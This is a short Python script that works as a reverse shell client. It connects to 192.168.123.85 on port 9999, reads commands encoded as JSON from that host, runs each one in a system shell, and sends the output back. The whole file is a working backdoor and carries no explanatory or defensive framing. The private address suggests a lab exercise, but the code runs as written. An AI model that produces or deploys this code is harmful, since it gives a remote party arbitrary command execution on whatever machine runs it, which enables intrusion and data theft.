import socket 
import json 
import subprocess
from subprocess import PIPE

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = "192.168.123.85"
port = 9999

soc.connect((ip,port))

def acc_command():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def exec_command():
    while True:
        command = acc_command()
        exec = subprocess.Popen(
            command,
            shell= True,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE,
        )
        data = exec.stdout.read() + exec.stderr.read()
        data = data.decode()
        output = json.dumps(data)
        soc.send(output.encode())

exec_command()        